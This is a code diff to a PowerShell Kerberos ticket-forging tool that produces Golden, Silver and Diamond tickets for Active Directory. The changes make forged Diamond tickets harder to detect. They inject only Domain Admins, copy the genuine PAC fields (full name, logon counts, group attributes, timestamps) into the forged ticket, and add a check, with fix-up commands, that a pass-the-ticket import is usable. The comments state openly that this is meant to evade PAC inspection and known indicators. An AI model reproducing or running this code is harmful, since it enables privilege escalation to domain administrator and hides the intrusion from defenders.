@@ -66,11 +66,16 @@ function Invoke-TicketForge {
 
 .PARAMETER GroupRIDs
     Array of group RIDs to include in the PAC's GroupIds field.
-    Default: @(512, 513, 518, 519, 520) — Domain Admins, Domain Users,
-    Schema Admins, Enterprise Admins, Group Policy Creator Owners.
-    IMPORTANT: Specifying this parameter REPLACES the entire default list.
-    If you want to keep the default privileged groups AND add custom ones,
-    you must include them explicitly (e.g., @(512, 513, 518, 519, 520, 1337)).
+
+    Golden/Silver: Default @(512, 513, 518, 519, 520) — Domain Admins, Domain Users,
+    Schema Admins, Enterprise Admins, Group Policy Creator Owners. Specifying this
+    parameter REPLACES the entire default list (e.g. @(512, 513, 518, 519, 520, 1337)
+    to keep the defaults and add a custom one).
+
+    Diamond: These RIDs are APPENDED to the user's real group memberships (parsed from
+    the genuine PAC), not used as a replacement. If not specified, only Domain Admins
+    (512) is injected — the broader default set is itself a detection indicator and is
+    therefore avoided for diamond tickets.
 
 .PARAMETER ExtraSIDs
     Array of additional full SIDs to include in the PAC's ExtraSids field.
@@ -343,6 +348,16 @@ function Invoke-TicketForge {
         # For Golden/Silver: Default UserRID to 500 if not specified
         $effectiveUserRID = if ($PSBoundParameters.ContainsKey('UserRID')) { $UserRID } else { 500 }
 
+        # Diamond Ticket group default: when the caller did NOT explicitly request groups,
+        # inject ONLY Domain Admins (512) instead of the well-known 5-group set
+        # (512/513/518/519/520). For a recut diamond these get APPENDED to the user's real
+        # memberships, so the synthetic block that the broader default would add is itself
+        # a documented IOC. Golden/Silver keep the full default set (they have no real PAC).
+        if ($Mode -eq 'Diamond' -and -not $PSBoundParameters.ContainsKey('GroupRIDs')) {
+            $GroupRIDs = @(512)
+            Write-Log "[Invoke-TicketForge] Diamond: no -GroupRIDs specified, injecting Domain Admins (512) only"
+        }
+
         # Dispatch to appropriate handler
         $result = switch ($Mode) {
             'Golden' {
@@ -486,6 +501,22 @@ function Invoke-TicketForge {
                 $result | Add-Member -NotePropertyName 'PassTheTicket' -NotePropertyValue $true -Force
                 $result | Add-Member -NotePropertyName 'PTTResult' -NotePropertyValue $pttResult -Force
                 $result.Message = "$($result.Message) - Ticket imported into session"
+
+                # KDC-locator sanity check: the ticket is now in the LSA cache, but Windows
+                # tools (net view, klist get, PsExec, ...) must locate a KDC for the ticket's
+                # realm to perform the TGS-REQ. On a machine that is NOT joined to that realm,
+                # this requires resolvable Kerberos SRV records (or a ksetup KDC mapping).
+                # If neither is present the ticket is valid but unusable via the Windows stack,
+                # failing with SEC_E_NO_LOGON_SERVERS (0xc000005e) - which looks like a bad
+                # ticket but is purely name resolution. Warn proactively so it is not mistaken
+                # for a forging error.
+                if (-not (Test-RealmKDCLocatable -Realm $result.Domain)) {
+                    Write-Warning ("[Invoke-TicketForge] Ticket imported, but Windows cannot locate a KDC for realm '$($result.Domain)' " +
+                        "(this host is not joined to it and no '_kerberos._tcp.$($result.Domain.ToLower())' SRV record resolves).")
+                    Write-Warning "[Invoke-TicketForge] Windows tools (net view, klist get, PsExec) will fail with 'no logon servers' (0xc000005e) until the realm is resolvable. The ticket itself is valid."
+                    Write-Warning "[Invoke-TicketForge] Fix on THIS host (elevated): Add-DnsClientNrptRule -Namespace '.$($result.Domain.ToLower())' -NameServers '<DC-IP>'   (alternatively: ksetup /addkdc $($result.Domain) <dc.fqdn> + reboot)"
+                    Write-Log "[Invoke-TicketForge] KDC locator warning emitted for realm '$($result.Domain)'"
+                }
             }
             else {
                 Write-Log "[Invoke-TicketForge] Failed to import ticket: $($pttResult.Error)" -Level Warning
@@ -529,6 +560,60 @@ function ConvertFrom-HexStringToBytes {
         $bytes[$i] = [Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
     }
     return $bytes
+}
+
+#endregion
+
+#region Helper: KDC Locator Check (Pass-the-Ticket usability)
+
+function Test-RealmKDCLocatable {
+    <#
+    .SYNOPSIS
+        Heuristically checks whether the Windows Kerberos stack can locate a KDC
+        for the given realm - i.e. whether a Pass-the-Ticket'd ticket will actually
+        be usable by Windows tools (which need a TGS-REQ).
+
+    .DESCRIPTION
+        A forged ticket can be imported into the LSA cache regardless of connectivity,
+        but using it (net view, klist get, PsExec, ...) requires Windows to find a KDC
+        for the ticket's realm. This succeeds when:
+          - the host is joined to that same realm, OR
+          - the realm's Kerberos SRV record (_kerberos._tcp.<realm>) is resolvable
+            (e.g. via DNS, a conditional forwarder, or a client-local NRPT rule).
+        Returns $true if locatable (or undeterminable - we do not warn on doubt),
+        $false only when we are confident Windows will fail with NO_LOGON_SERVERS.
+
+    .PARAMETER Realm
+        The Kerberos realm (ticket domain), e.g. "CONTOSO.COM".
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $false)]
+        [string]$Realm
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Realm)) { return $true }
+    $realmLower = $Realm.ToLowerInvariant()
+
+    # Joined to the same realm -> the LSA can always locate the KDC.
+    $machineDomain = $env:USERDNSDOMAIN
+    if ($machineDomain -and ($machineDomain.ToLowerInvariant() -eq $realmLower)) {
+        return $true
+    }
+
+    # Cross-realm: does the Kerberos SRV record resolve via the system resolver
+    # (this path honors NRPT rules and conditional forwarders, mirroring the LSA)?
+    try {
+        $srv = Resolve-SrvRecord -Name "_kerberos._tcp.$realmLower" -ErrorAction SilentlyContinue
+        if ($srv) { return $true }
+    }
+    catch {
+        # Resolver unavailable -> cannot prove failure, do not warn.
+        Write-Log "[Test-RealmKDCLocatable] SRV lookup error for '$realmLower': $_" -Level Debug
+        return $true
+    }
+
+    return $false
 }
 
 #endregion
@@ -793,21 +878,29 @@ function New-DiamondTicket {
         Creates a Diamond Ticket by acquiring a real TGT and rebuilding it with elevated privileges.
 
     .DESCRIPTION
-        Diamond Ticket "Hybrid" Approach:
-        1. Decrypts the provided TGT to extract: UserName, Domain, DomainSID, timestamps, session key
-        2. Rebuilds the ticket completely using the proven Golden Ticket implementation
-        3. Uses the requested groups (e.g., Domain Admins 512) in the new PAC
-        4. Preserves the original session key so TGS-REQ works
+        Diamond Ticket "Recut" Approach:
+        1. Decrypts the provided (genuine) TGT and PARSES its real PAC: identity fields
+           (FullName, profile, logon counters), real group memberships + attributes,
+           PrimaryGroupId, UserAccountControl, password timestamps, session key.
+        2. Rebuilds the ticket using the proven Golden Ticket PAC builder, but feeds the
+           real per-user fields back in (-SourceInfo) so the new LOGON_INFO mirrors the
+           legitimate one instead of leaving the blank/zeroed fields that betray a forgery.
+        3. APPENDS the requested groups (e.g., Domain Admins 512) to the user's real groups
+           rather than replacing them with the well-known default set (a documented IOC).
+        4. Preserves the original session key and timestamps so TGS-REQ works.
 
         OPSEC Behavior:
         - If -UserName is NOT provided: Keeps the original TGT user (stealthier - matches AS-REQ logs)
         - If -UserName IS provided: Impersonates that user (useful for specific scenarios)
 
-        OPSEC Value: A legitimate AS-REQ was issued to obtain the base TGT.
-        The final ticket uses our stable Golden Ticket PAC building.
+        OPSEC Value: A legitimate AS-REQ was issued to obtain the base TGT, AND the rebuilt
+        PAC carries the genuine directory-derived attributes, so PAC content inspection no
+        longer reveals the synthetic fingerprints of the original diamond PoC.
 
-        This approach avoids complex NDR in-place patching which is fragile across
-        different AD environments.
+        This rebuild-with-real-data approach avoids complex NDR in-place patching (which is
+        fragile across AD environments) while still preserving the authentic PAC contents.
+
+        Note: If the base TGT has no parseable PAC, it falls back to a synthetic rebuild.
 
     .PARAMETER UserName
         Optional. The user to impersonate in the forged ticket.
@@ -938,6 +1031,80 @@ function New-DiamondTicket {
         Write-Log "[New-DiamondTicket] Timestamps: Auth=$authTime, Start=$startTime, End=$endTime"
 
         # ============================================
+        # "RECUT": Preserve the genuine PAC, inject only groups
+        # ============================================
+        # A true Diamond Ticket modifies the legitimate PAC in place rather than replacing it
+        # with a synthetic one. The original PoC's tell-tale fingerprints (blank FullName,
+        # LogonCount=0, NORMAL_ACCOUNT UAC, and the well-known default group set
+        # 512/513/518/519/520) are a documented IOC. We instead:
+        #   - APPEND the requested groups to the user's real group memberships (no replace)
+        #   - carry over the real identity/session fields (FullName, LogonCount, profile, etc.)
+        #   - keep the real PrimaryGroupId and UserAccountControl
+        # so the rebuilt LOGON_INFO matches what the KDC actually issued.
+        $diamondSourceInfo = $null
+        $effectiveGroupRIDs = $GroupRIDs
+        $effectiveExtraSIDs = $ExtraSIDs
+        $effectivePrimaryGroupRID = $null
+        $effectiveUAC = $null
+        $effectiveLogonTime = $null
+
+        if ($parsedPAC) {
+            # Merge groups: real memberships first (keeping their real attributes), then any
+            # requested group not already present (with default attributes).
+            $origGroups = @($parsedPAC.GroupRIDs)
+            $origAttrs  = @($parsedPAC.GroupAttributes)
+            $mergedGroups = @()
+            $mergedAttrs  = @()
+            for ($i = 0; $i -lt $origGroups.Count; $i++) {
+                $mergedGroups += [uint32]$origGroups[$i]
+                if ($i -lt $origAttrs.Count) {
+                    $mergedAttrs += [uint32]$origAttrs[$i]
+                } else {
+                    $mergedAttrs += [uint32]$Script:DEFAULT_GROUP_ATTRIBUTES
+                }
+            }
+            foreach ($g in $GroupRIDs) {
+                if ($mergedGroups -notcontains [uint32]$g) {
+                    $mergedGroups += [uint32]$g
+                    $mergedAttrs  += [uint32]$Script:DEFAULT_GROUP_ATTRIBUTES
+                }
+            }
+            $effectiveGroupRIDs = $mergedGroups
+
+            # Merge ExtraSIDs (e.g. asserted-identity S-1-18-x present in modern TGTs) with any requested.
+            $mergedExtra = @()
+            foreach ($s in @($parsedPAC.ExtraSIDs)) { if ($s) { $mergedExtra += $s } }
+            foreach ($s in @($ExtraSIDs)) { if ($s -and ($mergedExtra -notcontains $s)) { $mergedExtra += $s } }
+            $effectiveExtraSIDs = $mergedExtra
+
+            if ($parsedPAC.PrimaryGroupRID) { $effectivePrimaryGroupRID = [uint32]$parsedPAC.PrimaryGroupRID }
+            if ($null -ne $parsedPAC.UserAccountControl) { $effectiveUAC = [uint32]$parsedPAC.UserAccountControl }
+            if ($parsedPAC.LogonTime) { $effectiveLogonTime = $parsedPAC.LogonTime }
+
+            # Carry the rich per-user identity/session fields into the rebuilt LOGON_INFO.
+            $diamondSourceInfo = @{
+                FullName              = $parsedPAC.FullName
+                LogonScript           = $parsedPAC.LogonScript
+                ProfilePath           = $parsedPAC.ProfilePath
+                HomeDirectory         = $parsedPAC.HomeDirectory
+                HomeDirectoryDrive    = $parsedPAC.HomeDirectoryDrive
+                LogonServer           = $parsedPAC.LogonServer
+                LogonCount            = $parsedPAC.LogonCount
+                BadPasswordCount      = $parsedPAC.BadPasswordCount
+                GroupAttributes       = $mergedAttrs
+                LogoffTimeRaw         = $parsedPAC.LogoffTimeRaw
+                KickOffTimeRaw        = $parsedPAC.KickOffTimeRaw
+                PasswordLastSetRaw    = $parsedPAC.PasswordLastSetRaw
+                PasswordCanChangeRaw  = $parsedPAC.PasswordCanChangeRaw
+                PasswordMustChangeRaw = $parsedPAC.PasswordMustChangeRaw
+            }
+            Write-Log "[New-DiamondTicket] Recut: real groups [$($origGroups -join ',')] + injected -> [$($effectiveGroupRIDs -join ',')]"
+        }
+        else {
+            Write-Log "[New-DiamondTicket] No parseable PAC in base TGT - falling back to synthetic PAC rebuild" -Level Warning
+        }
+
+        # ============================================
         # PHASE 2: Rebuild using Golden Ticket logic
         # ============================================
 
@@ -948,19 +1115,35 @@ function New-DiamondTicket {
         $domainFQDN = $Domain.ToUpper()
         $domainLower = $Domain.ToLower()
 
-        Write-Log "[New-DiamondTicket] Target: $UserName (RID $UserRID), Groups: $($GroupRIDs -join ', ')"
+        Write-Log "[New-DiamondTicket] Target: $UserName (RID $UserRID), Groups: $($effectiveGroupRIDs -join ', ')"
 
         # Build PAC using Golden Ticket's Build-PAC (proven to work)
-        Write-Log "[New-DiamondTicket] Building new PAC with requested groups..."
+        Write-Log "[New-DiamondTicket] Building new PAC with merged groups..."
 
         # CRITICAL: AuthTime must be truncated to second precision for CLIENT_INFO match
         $authTimeRounded = [datetime]::new($authTime.Year, $authTime.Month, $authTime.Day,
             $authTime.Hour, $authTime.Minute, $authTime.Second, [System.DateTimeKind]::Utc)
 
-        $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
-            -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
-            -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
-            -EncryptionType $EncryptionType -LogonTime $authTimeRounded -AuthTime $authTimeRounded
+        # LogonTime: prefer the real value from the genuine PAC (recut), else fall back to authtime.
+        $pacLogonTime = if ($effectiveLogonTime) { $effectiveLogonTime } else { $authTimeRounded }
+
+        $buildPacParams = @{
+            UserName       = $UserName
+            Domain         = $domainNetBIOS
+            DnsDomainName  = $Domain
+            DomainSID      = $DomainSID
+            UserRID        = $UserRID
+            GroupRIDs      = $effectiveGroupRIDs
+            ExtraSIDs      = $effectiveExtraSIDs
+            EncryptionType = $EncryptionType
+            LogonTime      = $pacLogonTime
+            AuthTime       = $authTimeRounded
+        }
+        if ($null -ne $effectivePrimaryGroupRID) { $buildPacParams['PrimaryGroupRID'] = $effectivePrimaryGroupRID }
+        if ($null -ne $effectiveUAC)             { $buildPacParams['UserAccountControl'] = $effectiveUAC }
+        if ($diamondSourceInfo)                  { $buildPacParams['SourceInfo'] = $diamondSourceInfo }
+
+        $pacResult = Build-PAC @buildPacParams
 
         $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
             -ServerChecksumOffset $pacResult.ServerChecksumOffset `
@@ -1014,8 +1197,8 @@ function New-DiamondTicket {
             UserRID = $UserRID
             OriginalGroups = if ($parsedPAC) { $parsedPAC.GroupRIDs } else { @() }
             AddedGroups = $GroupRIDs
-            GroupRIDs = $GroupRIDs
-            ExtraSIDs = $ExtraSIDs
+            GroupRIDs = $effectiveGroupRIDs
+            ExtraSIDs = $effectiveExtraSIDs
             EncryptionType = $EncryptionType
             EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
             Kvno = $Kvno
